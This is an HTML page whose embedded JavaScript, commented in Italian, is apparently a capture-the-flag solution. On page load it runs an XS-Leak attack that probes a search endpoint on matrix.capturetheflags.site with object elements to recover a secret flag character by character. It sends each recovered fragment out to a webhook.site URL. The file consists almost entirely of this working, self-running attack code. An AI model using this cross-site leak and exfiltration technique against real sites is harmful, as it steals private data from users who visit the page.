<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XS-Leak Flag Extraction</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 20px;
        }
        #result {
            margin-top: 20px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <h1>XS-Leak Flag Extraction</h1>
    <div id="result">In attesa di risultati...</div>

    <script>
        const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{}|;:',.<>?/"; // Caratteri possibili

        // Funzione per testare l'accessibilità di una risorsa
        const leak = (url) => {
            return new Promise((resolve) => {
                const s = document.createElement('object');
                s.data = url;

                s.onload = () => { 
                    s.remove();
                    resolve(true); // Risorsa accessibile (status 200)
                };
                s.onerror = () => { 
                    s.remove(); 
                    resolve(false); // Risorsa non accessibile (status 404 o errore)
                };

                document.body.appendChild(s);
            });
        };

        // Funzione per cercare la flag carattere per carattere
        const findFlag = async () => {
            let flag = "flag{";
            const resultDiv = document.getElementById('result');

            while (!flag.endsWith("}")) {
                let found = false; // Variabile per tracciare se un carattere è stato trovato

                for (const char of charset) {
                    const testFlag = `${flag}${char}`; // Prova con il carattere attuale
                    const url = `https://matrix.capturetheflags.site/search?s=${testFlag}`; 
                    const accessible = await leak(url); // Controlla l'accessibilità

                    if (accessible) { // Se la risorsa è accessibile
                        flag += char; // Aggiungi il carattere alla flag
                        resultDiv.textContent = `Flag trovata finora: ${flag}`; // Mostra l'attuale flag parziale
                        await logResult(`Flag parziale: ${flag}`); // Log del progresso
                        found = true; // Imposta che è stato trovato un carattere
                        break; // Esci dal ciclo per passare al prossimo carattere
                    }
                }

                if (!found) {
                    console.log('Nessun carattere trovato, potrebbe essere un problema.'); // Opzionale: messaggio di avviso
                    break; // Interrompe il ciclo se non viene trovato alcun carattere
                }
            }

            if (flag.endsWith("}")) {
                resultDiv.textContent = `Flag completa trovata: ${flag}`; // Mostra la flag finale
                await logResult(`Flag completa trovata: ${flag}`); // Log della flag completa
            } else {
                resultDiv.textContent = 'La ricerca della flag è stata interrotta. Verifica il server.'; // Messaggio di errore
            }
        };

        // Funzione per inviare il log al Webhook
        const logResult = async (message) => {
            const webhookUrl = 'https://webhook.site/d1c2d4d1-02cc-4007-bf6c-1d3cc3528bad'; // URL per il logging
            try {
                const urlWithParams = `${webhookUrl}?message=${encodeURIComponent(message)}`; // Parametrizza il messaggio
                await fetch(urlWithParams, { method: 'GET' }); // Invia il log
                console.log('Log inviato con successo');
            } catch (error) {
                console.error('Errore di rete:', error);
            }
        };

        // Esegui il test al caricamento del DOM
        document.addEventListener('DOMContentLoaded', findFlag);
    </script>
</body>
</html>
